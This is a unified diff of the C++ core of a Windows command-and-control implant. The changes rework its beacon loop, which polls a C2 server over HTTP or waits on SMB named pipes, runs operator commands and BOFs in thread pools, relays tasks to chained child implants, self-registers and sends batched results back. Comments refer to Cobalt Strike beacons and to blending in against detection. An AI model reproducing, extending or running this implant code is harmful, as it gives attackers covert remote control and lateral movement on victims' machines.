@@ -1,7 +1,8 @@
 /* <clean me up>
 ==========================================================================================
 The big: "How the fuck does this work" block of text to save anyone reading this some pain.
-I promise it's simpler than it looks.
+I promise it's simpler than it looks. I've done my best to comment just about everywhere
+something could be ambigious/there's a reason to comment.
 
 TLDR: Windows Async + OS ThreadPools. The code is NOT sequential.
 The main loop never executes commands directly; it only moves tasks to where they need to go.
@@ -30,8 +31,8 @@ The main loop never executes commands directly; it only moves tasks to where the
    OS threads do the heavy lifting.
    - Local: `TaskHandler` runs the `command_tree` (ls, whoami, BOFs, in commandtree.cpp)
    - Proxy: `ChildRoutingHandler` opens an SMB pipe to a child, sends the task, and
-     waits for the child to reply. This *does* block that thraed, but it's a BG task so
-     it doesn't stop our main thread.
+	 waits for the child to reply. This *does* block that thraed, but it's a BG task so
+	 it doesn't stop our main thread.
 
 5. THE HANDOFF & EGRESS
    Once a background worker gets a result, it locks the `queue_mutex`, shoves
@@ -55,24 +56,24 @@ Example of a synchronous "cycle" function:
 (notice how simple this is lol)
 
 while (true) {
-    // Fetch task array
-    nlohmann::json inbound_task_array = current_ingress_->fetch_task(implant_uuid_);
+	// Fetch task array
+	nlohmann::json inbound_task_array = current_ingress_->fetch_task(implant_uuid_);
 
-    for (const auto& task : inbound_task_array) {
-        // Execute task
-        nlohmann::json task_results = command_tree(task_data);
+	for (const auto& task : inbound_task_array) {
+		// Execute task
+		nlohmann::json task_results = command_tree(task_data);
 
-        //optional... check if uuid is ours or not...
+		//optional... check if uuid is ours or not...
 
-        // 3. Pack & Send
-        std::vector<uint8_t> packed = nlohmann::json::to_msgpack(task_results);
-        current_egress_->send_response(implant_uuid_, packed);
+		// 3. Pack & Send
+		std::vector<uint8_t> packed = nlohmann::json::to_msgpack(task_results);
+		current_egress_->send_response(implant_uuid_, packed);
 
-        //you could sleep here too
-    }
+		//you could sleep here too
+	}
 
-    // Sleep
-    Sleep(5000);
+	// Sleep
+	Sleep(5000);
 }
 */
 
@@ -90,15 +91,17 @@ while (true) {
 #include <vector>
 #include <string>
 #include "data/msgpack/msgpack.h"
+#include "systems/childhandler.h"
 #include "comms/smb.h"
-
+#include "comms/queues.h"
+#include "data/uuid7.h"
 // ======================================================================================
 // Global Vars (own file?)
 // ======================================================================================
 // Thread-safe response queue for background workers
 // Might be a good idea to toss into its own file
-std::queue<nlohmann::json> response_queue;
-std::mutex queue_mutex;
+//std::queue<nlohmann::json> response_queue;
+//std::mutex queue_mutex;
 
 // Signals the main loop when a background task completes
 HANDLE h_data_ready_event = NULL;
@@ -109,74 +112,98 @@ HANDLE h_data_ready_event = NULL;
 // 1. THREAD POOL WORKER LOGIC/ASYNC HANDLERS
 // ======================================================================================
 
-//pass to child
-//Handler for ASYNC routing of data to child implants.
-VOID CALLBACK ChildRoutingHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
-    nlohmann::json* task_ptr = static_cast<nlohmann::json*>(Context);
-    nlohmann::json task_data = *task_ptr;
-    nlohmann::json result = route_task_to_child_implant(task_data);
 
-    // If the child actually gave us a response, queue it up for the parent C2 to send back
-    if (!result.is_null()) {
-        std::lock_guard<std::mutex> lock(queue_mutex);
-        response_queue.push(result);
-    }
+VOID CALLBACK ChildRouterWorker(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
+	ChildRouteContext* ctx = static_cast<ChildRouteContext*>(Context);
 
-    SetEvent(h_data_ready_event);
-    delete task_ptr;
-    CloseThreadpoolWork(Work);
+	ChildRouteInfo cri;
+	if (!ChildHandler::instance().get_child(ctx->implant_uuid, cri)) {
+		std::cerr << "[-] Route lookup failed for child UUID: " << ctx->implant_uuid << std::endl;
+		delete ctx;
+		CloseThreadpoolWork(Work);
+		return;
+	}
+
+	nlohmann::json task_response = SMB::Parent::cycle_child(
+		cri.h_pipe_inbox, cri.h_pipe_outbox, ctx->task, true
+	);
+
+	if (!task_response.is_null() && !task_response.empty()) {
+		bool data_added = false;
+
+		if (task_response.is_array()) {
+			for (const auto& item : task_response) {
+				PostQueue::push(item);
+				data_added = true;
+			}
+		}
+		else if (task_response.is_object()) {
+			PostQueue::push(task_response);
+			data_added = true;
+		}
+
+		if (data_added) {
+			SetEvent(h_data_ready_event);
+		}
+	}
+
+	delete ctx;
+	CloseThreadpoolWork(Work);
 }
-void C2Implant::dispatch_to_child_router(const nlohmann::json& task) {
-    nlohmann::json* task_context = new nlohmann::json(task);
-    //yeet into OS threadpool
-    PTP_WORK work_item = CreateThreadpoolWork(ChildRoutingHandler, task_context, NULL);
-    if (work_item) {
-        SubmitThreadpoolWork(work_item);
-    }
-    else {
-        delete task_context;
-    }
+
+void C2Implant::dispatch_to_child_router(const nlohmann::json& task, const std::string implant_uuid) {
+	// Allocate context on the heap so it survives the thread handoff
+	ChildRouteContext* ctx = new ChildRouteContext{ task, implant_uuid };
+
+	// Toss it to the OS Threadpool
+	PTP_WORK work_item = CreateThreadpoolWork(ChildRouterWorker, ctx, NULL);
+	if (work_item) {
+		SubmitThreadpoolWork(work_item);
+		std::cout << "[+] Task handed to background child router for: " << implant_uuid << std::endl;
+	}
+	else {
+		std::cerr << "[-] Failed to create threadpool work for child router." << std::endl;
+		delete ctx;
+	}
 }
-
-//delme - next steps, copy this project, make one of these parent (egress), one of these linked, and test it out.
-
 
 //local task
 VOID CALLBACK TaskHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
-    // 1. Recover task data from the heap
-    nlohmann::json* task_ptr = static_cast<nlohmann::json*>(Context);
-    nlohmann::json task_data = *task_ptr;
+	// 1. Recover task data from the heap
+	nlohmann::json* task_ptr = static_cast<nlohmann::json*>(Context);
+	nlohmann::json task_data = *task_ptr;
 
-    // 2. Execute the actual command (ls, cd, bof, etc)
-    nlohmann::json result = command_tree(task_data);
+	// 2. Execute the actual command (ls, cd, bof, etc)
+	nlohmann::json result = command_tree(task_data);
 
-    // 3. Ensure the response is linked to the original tasking
-    result["task_uuid"] = task_data["task_uuid"];
+	// 3. Ensure the response is linked to the original tasking
+	result["task_uuid"] = task_data["task_uuid"];
 
-    // 4. Safely queue the result for the egress transport
-    {
-        std::lock_guard<std::mutex> lock(queue_mutex);
-        response_queue.push(result);
-    }
+	// 4. Safely queue the result for the egress transport
+	//{
+	//	std::lock_guard<std::mutex> lock(queue_mutex);
+	//	response_queue.push(result);
+	//}
+	PostQueue::push(result);
 
-    // 5. Wake up the main cycle() loop to send the response
-    SetEvent(h_data_ready_event);
+	// 5. Wake up the main cycle() loop to send the response
+	SetEvent(h_data_ready_event);
 
-    // 6. Cleanup
-    delete task_ptr;
-    CloseThreadpoolWork(Work);
+	// 6. Cleanup
+	delete task_ptr;
+	CloseThreadpoolWork(Work);
 }
 
 void C2Implant::dispatch_to_threadpool(const nlohmann::json& task) {
-    nlohmann::json* task_context = new nlohmann::json(task);
-    //yeet into OS threadpool
-    PTP_WORK work_item = CreateThreadpoolWork(TaskHandler, task_context, NULL);
-    if (work_item) {
-        SubmitThreadpoolWork(work_item);
-    }
-    else {
-        delete task_context;
-    }
+	nlohmann::json* task_context = new nlohmann::json(task);
+	//yeet into OS threadpool
+	PTP_WORK work_item = CreateThreadpoolWork(TaskHandler, task_context, NULL);
+	if (work_item) {
+		SubmitThreadpoolWork(work_item);
+	}
+	else {
+		delete task_context;
+	}
 }
 
 // ======================================================================================
@@ -184,14 +211,21 @@ void C2Implant::dispatch_to_threadpool(const nlohmann::json& task) {
 // ======================================================================================
 
 void C2Implant::init() {
-    //register our pipes. Move me later
-    //note - this hangs here waiting for a parent to connect to it
-    //this should ONLY be called somehow, if the method switched to SMB
-    //i.e., a if not setup yet, register pipe after strat switch to smb
-    //if (register_pipe(h_inbox_, h_outbox_) != 0) {
-    //    std::cerr << "Failed to register pipes." << std::endl;
-    //    return;
-    //}
+	/*
+	This class should probably be in the contructor.
+
+	Anyways, bad desgin aside, this initalizees all the needed components of the
+	C2 class. This HAS to get called  first, or everything will break.
+
+	Things such as the following are setup here:
+
+	- Initial INGRESS strat
+	- Initial EGRESS strat
+	- Loading of available INGRESS/EGRESS strats (for operator selection)
+
+	- Initing of the h_data_ready_event synchronization event, which tells us when we've got
+		some data ready for us.
+	*/
 
     /* template me - append listener names here */
     //declare list of valid get & post strats, for strat commands & strat lookups
@@ -234,6 +268,15 @@ void C2Implant::init() {
 
     // Build the transports for the first time, so the pointers exist
     this->update_transports();
+
+	//annnnd regester implant
+	std::string implant_uuid = uuid7::generate();
+	//send our first what's up message, there should be no tasks available for us yet,
+	//cuz according to the server, before this call, we don't exist.
+	nlohmann::json data = current_ingress_->get(implant_uuid);
+
+	SettingsManager::instance().set("registered", 1);
+	implant_uuid_ = implant_uuid;
 
 }
 
@@ -303,7 +346,8 @@ void C2Implant::update_transports() {
     [%- endfor %]
     
     /* END TEMPLATE MEEEE */
-	else if (get_strat.find("pipe") != std::string::npos) {
+	
+    	else if (get_strat.find("pipe") != std::string::npos) {
 		/*
 		========================================================================
 		SMB / NAMED PIPE INGRESS (P2P Child)
@@ -323,10 +367,16 @@ void C2Implant::update_transports() {
 				C. Hook up the newly registered inbox handle.
 		========================================================================
 		*/
-		if (h_inbox_ != INVALID_HANDLE_VALUE) {
-			current_ingress_ = new PipeIngress(h_inbox_);
+		//if (h_inbox_ != INVALID_HANDLE_VALUE) {
+		//	current_ingress_ = new PipeIngress(h_inbox_);
+		//	std::cout << "[*] INGRESS == pipe!" << std::endl;
+		//}
+		if (h_inbox_ != INVALID_HANDLE_VALUE && h_outbox_ != INVALID_HANDLE_VALUE) {
+			// Pass both so Ingress can Write -> Read
+			current_ingress_ = new PipeIngress(h_inbox_, h_outbox_);
 			std::cout << "[*] INGRESS == pipe!" << std::endl;
 		}
+
 		else {
 			std::cout << "[!] handle of GET pipe ==  INVALID_HANDLE_VALUE" << std::endl;
 			//check if pipes are registered, if not, check previous handles (close if they are open)
@@ -338,16 +388,17 @@ void C2Implant::update_transports() {
 				h_outbox_ = INVALID_HANDLE_VALUE;
 			}
 
-			if (register_pipe(h_inbox_, h_outbox_) != 0) {
+			if (SMB::Child::register_pipe(h_inbox_, h_outbox_) != 0) {
 				std::cerr << "Failed to register pipes." << std::endl;
 				return;
 			}
 			//set current ingress to pipe
-			current_ingress_ = new PipeIngress(h_inbox_);
+			current_ingress_ = new PipeIngress(h_inbox_, h_outbox_);
 			std::cout << "[*] INGRESS == pipe!" << std::endl;
 		}
 
 	}
+
 	/* END TEMPLATE MEEEE  [this block was generated by a jinja template]*/
 
 
@@ -421,7 +472,7 @@ void C2Implant::update_transports() {
 				h_inbox_ = INVALID_HANDLE_VALUE;
 			}
 
-			if (register_pipe(h_inbox_, h_outbox_) != 0) {
+			if (SMB::Child::register_pipe(h_inbox_, h_outbox_) != 0) {
 				std::cerr << "Failed to register pipes." << std::endl;
 				return;
 			}
@@ -437,176 +488,160 @@ void C2Implant::update_transports() {
 
 }
 
-int C2Implant::register_implant() {
-	std::cout << "[*] Attempting Registration..." << std::endl;
+void C2Implant::cycle() {
+	//var for previous strat & tracking changes
+	std::string active_ingress_strat_name = SettingsManager::instance().get<std::string>("comms_get_function", "");
+	std::string active_egress_strat_name = SettingsManager::instance().get<std::string>("comms_post_function", "");
 
-	if (!current_ingress_) {
-		std::cout << "No current_ingress_, cannot register!" << std::endl;
-		return -1;
-	}
+	while (true) {
 
-	// Registration uses a "Zero UUID" to signal the server
-	nlohmann::json data = current_ingress_->fetch_task("00000000-0000-0000-0000-000000000000", true);
+		std::cout << "[*] Start of cycle" << std::endl;
 
-	//pullout first message, as this is a list too technically.
-	//no task uuid on register, just the implant uuid to setup  registration
-	if (data.is_array() && !data.empty()) {
-		nlohmann::json reg_data = data[0]; // Pop the first item out of the array
+		//a quick check, to update the strats, if/when the operator switches strat
+		std::string desired_ingress = SettingsManager::instance().get<std::string>("comms_get_function", "");
+		std::string desired_egress = SettingsManager::instance().get<std::string>("comms_post_function", "");
 
-		//debug dump
-		std::cout << reg_data.dump(4) << std::endl;
+		if (active_ingress_strat_name != desired_ingress || active_egress_strat_name != desired_egress) {
+			std::cout << "[*] Strategy change detected! Rebuilding transports..." << std::endl;
+			this->update_transports();
 
-		if (reg_data.contains("implant_uuid")) {
-			implant_uuid_ = reg_data["implant_uuid"];
-			std::cout << "[+] Registered! UUID: " << implant_uuid_ << std::endl;
-			SettingsManager::instance().set("registered", 1);
-			return 1;
+			// Sync our local tracking variables
+			active_ingress_strat_name = desired_ingress;
+			active_egress_strat_name = desired_egress;
+		}
+
+		//current ingress/egress are class vars
+		//lets make sure these exist, otherwise, sleep
+		if (!current_ingress_ || !current_egress_) {
+			this->sleep_implant();
+			continue;
+		}
+
+		/*
+		Get the wait handle
+
+		This is either:
+
+		NULL:
+			> poll based comms method
+
+		or an actual handle.
+
+		This is used to decide how we wait for the object, and is the psuedo sleep.
+
+		*/
+		HANDLE h_in_event = current_ingress_->get_wait_handle();
+		DWORD timeout = (h_in_event != NULL) ? INFINITE : (SettingsManager::instance().get<int>("sleep_time", 5) * 1000);
+
+		DWORD result;
+
+		if (h_in_event != NULL) {
+			// --- PIPE MODE ---
+			// Wait for either the Pipe (Index 0) or the Worker (Index 1)
+			HANDLE handles[2] = { h_in_event, h_data_ready_event };
+			result = WaitForMultipleObjects(2, handles, FALSE, timeout);
 		}
 		else {
-			std::cout << "implant_uuid key not found?" << std::endl;
+			// --- HTTP/non handle based comms MODE ---
+			// We ONLY wait for the Worker. The "Fetch" happens via the timeout.
+			//if no task, this is effectively the sleep. 
+			result = WaitForSingleObject(h_data_ready_event, timeout);
+		}
+
+		// --- Event Handling/Dispatcher ---
+		/*
+		   This block functions as a state machine that handles the transition
+		   between Ingress and Egress communication methods
+
+		   The dispatcher accounts for the fundamental difference between:
+		   1. POLL-based (Implant-initiated 'Pull')
+			> i.e. HTTP
+		   2. HANDLE-based (Kernel-signaled 'Push')
+			> i.e., Named Pipes
+
+			This adds a bit of complexity to the implant, but also allows
+			for protocol switching, and use of handle based methods, like named pipes,
+			on every implant.
+		*/
+
+		// ================================================================================
+		// TRIGGER 1: POLL-BASED INGRESS (Wait Timeout)
+		// For transports without a kernel handle (HTTP/DNS), the "GET" is triggered 
+		// by the expiration of the sleep/jitter timer (via WaitForSingleObject)
+		// It's quieter than a Sleep call, and WaitForSingleObject without INFINITE 
+		// should hopefully blend in. 
+		// ================================================================================
+		//if (result == WAIT_TIMEOUT) {
+		//    // This ONLY triggers when the 5 seconds pass without a worker finishing.
+		//    // It ensures we consistently "GET" even if we haven't just "POSTed" something.
+		//    nlohmann::json task = ingress->fetch_task(implant_uuid_);
+		//    if (!task.is_null() && task.contains("task_uuid")) {
+		//        dispatch_to_threadpool(task);
+		//    }
+		//}
+		if (result == WAIT_TIMEOUT) {
+			std::cout << "[*] Poll Based Ingress" << std::endl;
+
+			nlohmann::json incoming = current_ingress_->get(implant_uuid_);
+
+			handle_tasks(incoming);
+
+		}
+		// ================================================================================
+		// TRIGGER 2: HANDLE-BASED INGRESS (Kernel Signal)
+		// For transports with a kernel handle (Pipes/Sockets), the Windows Kernel 
+		// signals this thread as soon as data arrives, bypassing the need for a timer/polling.
+		// ex, parent implant writes task to our SMB inbox pipe
+		// ================================================================================
+		/*
+		Quick note - smb/handle beacons act whenever they get data. It's my understanding
+		this is "fine", as:
+		1. you already have a foothold and data is (presumably) not leaving the network
+			> unless someone is fucking crazy, has SMB open on their external FW, you
+			  run an implant on your own host, and point that implant at the SMB child Implant
+			  through that FW.
+
+		2. It adds a lot of delay with chained beacons, if every single one has it's own sleep
+		timer to wait for.
+
+		It also appears (from playing with Cobalt Beacons) that they operate in "realtime" over
+		SMB anyways, so if they can do it so can we?
+
+		Who knows. Just something to be aware of.
+
+		TLDR: SMB/handle comms via Implant have  no set sleep time. When it gets data, it acts, as fast or as slow as that is.
+		*/
+		else if (h_in_event != NULL && result == WAIT_OBJECT_0) {
+			std::cout << "[*] Handle Based Ingress" << std::endl;
+			nlohmann::json incoming = current_ingress_->get(implant_uuid_);
+
+			handle_tasks(incoming);
+		}
+
+		// ================================================================================
+		// TRIGGER 3: WORKER COMPLETION (Internal Signal)
+		// Regardless of the ingress method, this triggers when a background worker 
+		// finishes a command and places the result in the response_queue. This is our 
+		// (literal) signal to send back our data. 
+		// ================================================================================
+		else if (result == WAIT_OBJECT_0 || (h_in_event != NULL && result == WAIT_OBJECT_0 + 1)) {
+			std::cout << "[*] Worker completed, queueing task response" << std::endl;
+
+			std::lock_guard<std::mutex> lock(PostQueue::mutex);
+			if (!PostQueue::post_queue.empty()) {
+				//lol why the double if
+				// Drain the queue and pack it into a single json array
+				if (!PostQueue::post_queue.empty()) {
+					nlohmann::json batched_json = create_batched_task_json(implant_uuid_, PostQueue::post_queue);
+
+					// Then give the JSON to the egress method to do what it needs for network transport
+					//currently, msgpack
+					current_egress_->send_response(implant_uuid_, batched_json);
+
+				} //lock goes out of scope here, and unlocks
+			}
 		}
 	}
-
-	else {
-		std::cout << "data is not an array" << std::endl;
-	}
-
-	return -1;
-}
-
-void C2Implant::cycle() {
-    while (true) {
-
-        std::cout << "[*] Start of cycle" << std::endl;
-
-        //current ingress/egress are class vars
-        if (!current_ingress_ || !current_egress_) {
-            this->sleep_implant();
-            continue;
-        }
-
-        /*
-        Get the wait handle
-
-        This is either:
-        
-        NULL: 
-            > poll based comms method
-
-        or an actual handle.
-
-        This is used to decide how we wait for the object, and is the psuedo sleep. 
-        
-        */
-        HANDLE h_in_event = current_ingress_->get_wait_handle();
-        DWORD timeout = (h_in_event != NULL) ? INFINITE : (SettingsManager::instance().get<int>("sleep_time", 5) * 1000);
-
-        DWORD result;
-
-        if (h_in_event != NULL) {
-            // --- PIPE MODE ---
-            // Wait for either the Pipe (Index 0) or the Worker (Index 1)
-            HANDLE handles[2] = { h_in_event, h_data_ready_event };
-            result = WaitForMultipleObjects(2, handles, FALSE, timeout);
-        }
-        else {
-            // --- HTTP/non handle based comms MODE ---
-            // We ONLY wait for the Worker. The "Fetch" happens via the timeout.
-            //if no task, this is effectively the sleep. 
-            result = WaitForSingleObject(h_data_ready_event, timeout);
-        }
-
-        // --- Event Handling/Dispatcher ---
-        /*
-           This block functions as a state machine that handles the transition
-           between Ingress and Egress communication methods
-
-           The dispatcher accounts for the fundamental difference between:
-           1. POLL-based (Implant-initiated 'Pull')
-            > i.e. HTTP
-           2. HANDLE-based (Kernel-signaled 'Push')
-            > i.e., Named Pipes
-
-            This adds a bit of complexity to the implant, but also allows
-            for protocol switching, and use of handle based methods, like named pipes,
-            on every implant.
-        */
-
-        // ================================================================================
-        // TRIGGER 1: POLL-BASED INGRESS (Wait Timeout)
-        // For transports without a kernel handle (HTTP/DNS), the "GET" is triggered 
-        // by the expiration of the sleep/jitter timer (via WaitForSingleObject)
-        // It's quieter than a Sleep call, and WaitForSingleObject without INFINITE 
-        // should hopefully blend in. 
-        // ================================================================================
-        //if (result == WAIT_TIMEOUT) {
-        //    // This ONLY triggers when the 5 seconds pass without a worker finishing.
-        //    // It ensures we consistently "GET" even if we haven't just "POSTed" something.
-        //    nlohmann::json task = ingress->fetch_task(implant_uuid_);
-        //    if (!task.is_null() && task.contains("task_uuid")) {
-        //        dispatch_to_threadpool(task);
-        //    }
-        //}
-        if (result == WAIT_TIMEOUT) {
-            std::cout << "[*] Poll Based Ingress" << std::endl;
-
-            nlohmann::json incoming = current_ingress_->fetch_task(implant_uuid_);
-            handle_tasks(incoming);
-
-        }
-        // ================================================================================
-        // TRIGGER 2: HANDLE-BASED INGRESS (Kernel Signal)
-        // For transports with a kernel handle (Pipes/Sockets), the Windows Kernel 
-        // signals this thread as soon as data arrives, bypassing the need for a timer/polling.
-        // ex, parent implant writes task to our SMB inbox pipe
-        // ================================================================================
-        /*
-        Quick note - smb/handle beacons act whenever they get data. It's my understanding
-        this is "fine", as:
-        1. you already have a foothold and data is (presumably) not leaving the network
-            > unless someone is fucking crazy, has SMB open on their external FW, you
-              run an implant on your own host, and point that implant at the SMB child Implant
-              through that FW.
-
-        2. It adds a lot of delay with chained beacons, if every single one has it's own sleep
-        timer to wait for.
-
-        It also appears (from playing with Cobalt Beacons) that they operate in "realtime" over
-        SMB anyways, so if they can do it so can we?
-
-        Who knows. Just something to be aware of.
-
-        TLDR: SMB/handle comms via Implant have  no set sleep time. When it gets data, it acts, as fast or as slow as that is. 
-        */
-        else if (h_in_event != NULL && result == WAIT_OBJECT_0) {
-            std::cout << "[*] Handle Based Ingress" << std::endl;
-            nlohmann::json incoming = current_ingress_->fetch_task(implant_uuid_);
-            handle_tasks(incoming);
-        }
-
-        // ================================================================================
-        // TRIGGER 3: WORKER COMPLETION (Internal Signal)
-        // Regardless of the ingress method, this triggers when a background worker 
-        // finishes a command and places the result in the response_queue. This is our 
-        // (literal) signal to send back our data. 
-        // ================================================================================
-        else if (result == WAIT_OBJECT_0 || (h_in_event != NULL && result == WAIT_OBJECT_0 + 1)) {
-            std::cout << "[*] Worker completed, queueing task response" << std::endl;
-
-            std::lock_guard<std::mutex> lock(queue_mutex);
-            if (!response_queue.empty()) {
-                std::vector<uint8_t> batched_buffer;
-
-                // Drain the queue and pack it into a single MsgPack buffer
-                //Ex: [{task_uuid:1234},{task_uuid:12345} ] -> bytes of msgpack
-                if (create_batched_task_response(implant_uuid_, response_queue, batched_buffer) == 0) {
-                    //todo: update signature of send_response
-                    current_egress_->send_response(implant_uuid_, batched_buffer);
-                }
-
-            } //lock goes out of scope here, and unlocks
-        }
-    }
 }
 
 void C2Implant::sleep_implant() {
@@ -615,42 +650,40 @@ void C2Implant::sleep_implant() {
 }
 
 
+
 //Helper to handle tasks 
 void C2Implant::handle_tasks(const nlohmann::json& incoming) {
-    // Handle HTTP 204/40X / Empty Pipes
-    if (incoming.is_null()) {
-        std::cout << "No tasks" << std::endl;
-        return; // Nothing to do, go back to sleep/wait
-    }
+	//debug inbound
+	std::cout << incoming.dump(4) << std::endl;
 
-    // Handle task array
-    if (incoming.is_array()) {
-        std::cout << "Task List recieved" << std::endl;
+	// Handle HTTP 204/40X / Empty Pipes
+	if (incoming.is_null()) {
+		std::cout << "No tasks" << std::endl;
+		return; // Nothing to do, go back to sleep/wait
+	}
 
-        for (const auto& task : incoming) {
-            // Safety check: Does it have the required routing data?
-            if (!task.is_null() && task.contains("implant_uuid") && task.contains("task_uuid")) {
 
-                // If it's our UUID, process it
-                if (task["implant_uuid"] == this->implant_uuid_) {
-                    dispatch_to_threadpool(task);
-                }
-                // Otherwise, route it down the chain
-                else {
-                    //this may be prone to failure, if this hangs, everything probably hangs
-                    std::cout << "[*] Routing task to child asynchronously..." << std::endl;
-                    dispatch_to_child_router(task);
-                }
-            }
-        }
-    }
-    // Fallback: Just in case the server accidentally sends a single object instead of a list
-    // it should never do this. Keeping as dev code just in case.
-    //else if (incoming.is_object()) {
-    //    if (incoming.contains("implant_uuid") && incoming.contains("task_uuid")) {
-    //        if (incoming["implant_uuid"] == this->implant_uuid_) {
-    //            dispatch_to_threadpool(incoming);
-    //        }
-    //    }
-    //}
+	// Handle task array
+	if (incoming.is_array()) {
+		std::cout << "Task List recieved" << std::endl;
+
+		for (const auto& task : incoming) {
+			// Safety check: Does it have the required routing data?
+			if (!task.is_null() && task.contains("implant_uuid") && task.contains("task_uuid")) {
+
+				// If it's our UUID, process it
+				if (task["implant_uuid"] == this->implant_uuid_) {
+					dispatch_to_threadpool(task);
+				}
+				// Otherwise, route it down the chain
+				else {
+					//this may be prone to failure, if this hangs, everything probably hangs
+					std::cout << "[*] Routing task to child asynchronously..." << std::endl;
+					dispatch_to_child_router(task, task["implant_uuid"]);
+				}
+			}
+		}
+	}
+
+
 }
